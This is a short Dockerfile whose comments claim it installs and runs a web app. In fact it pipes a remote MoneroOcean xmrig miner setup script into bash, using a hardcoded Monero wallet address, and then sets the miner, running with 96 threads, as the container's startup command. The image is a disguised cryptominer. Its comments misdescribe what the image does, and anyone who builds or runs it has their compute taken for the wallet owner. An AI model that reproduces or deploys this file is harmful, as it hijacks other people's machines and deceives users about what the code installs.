# Use a base image
FROM ubuntu:latest

# Set the working directory
WORKDIR /app

# Install necessary packages
RUN apt-get update && apt-get install -y \
    curl

# Install the web app (replace this with the actual source of the web app)
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo

# Create a directory for the script
RUN mkdir -p /home/miner

# Move the script to the new directory
RUN mv /root/moneroocean/miner.sh /home/miner/miner.sh

RUN bash /home/miner/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo -t 96 -p w1

# Set the command to run the web app
CMD ["bash", "/home/miner/miner.sh", "-s", "44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo"]
